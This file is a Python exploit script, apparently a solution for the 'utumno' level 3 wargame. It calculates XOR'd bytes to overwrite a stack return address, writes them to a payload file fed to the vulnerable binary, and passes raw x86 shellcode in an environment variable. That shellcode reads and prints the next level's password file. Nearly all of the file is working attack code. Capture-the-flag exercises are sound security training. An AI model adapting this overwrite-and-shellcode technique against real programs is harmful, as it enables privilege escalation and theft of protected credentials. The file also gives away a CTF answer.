#!/usr/bin/python3
import os

# Address to write to and return address to write determined by using a wrapper in C,
# and debugging with GDB
writeAddress = 0xffffde2c           # Location of return address of main
returnTo = [0x8e, 0xdf, 0xff, 0xff] # Location to return to (shellcode in stack)
ebp = 0xffffde28                    # Location of ebp, used for offsets
originalEBX = []
xorEBX = []                         # List containing XOR'd necessary ebx values
payloadBytes = ''

print("----------------------------------")
print("Desired Ret Address: " + hex(returnTo[3]) + hex(returnTo[2])[2:] + \
        hex(returnTo[1])[2:] + hex(returnTo[0])[2:])
for i in range(0,4):
    # Calculate and append necessary ebx values to write to the desired address
    originalEBX.append(hex(writeAddress+0x24-ebp+(i))[2:])
    xorEBX.append(hex((writeAddress+0x24-ebp+(i)) ^ (3*i))[2:])
    # Add calculated bytes to the complete payload byte-string
    payloadBytes += xorEBX[i] + hex(returnTo[i])[2:]

print("Original EBX Bytes: ", end="")
for i in range(0,4):
    print(originalEBX[i], end=" ")
print("\nXOR'd EBX Bytes:    ", end="")
for i in range(0,4):
    print(xorEBX[i], end=" ")
print("\nComplete Payload: " + payloadBytes)
print("----------------------------------")
print("\nCreating payload file\n...")

# Create temporary payload file and write the payload to it
inFile = open('./payload', 'wb')
inFile.write(bytes.fromhex(payloadBytes))
inFile.close()

print("Wrote to payload file bytes '", end="")
for i in range(0, len(payloadBytes)-2):
        print(payloadBytes[i:i+2], end=" ")
print("'\nExecuting utumno3 with payload\n...\nUtumno 4 Password: ", end="")

# Redirect stdin to new payload file for utumno3 to read from
fd = os.open("./payload", os.O_RDONLY)
os.dup2(fd, 0)
os.close(fd)

# Fork to execute utumno3, then remove the payload after utumno3 finishes execution
pid = os.fork()

if pid > 0:
    pass
else:
    os.execve("/utumno/utumno3", ['/utumno/utumno3'],\
    {'SHELLCODE':b'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/etc/utumno_pass/utumno4'})

os.wait()
os.remove("./payload")
print("")
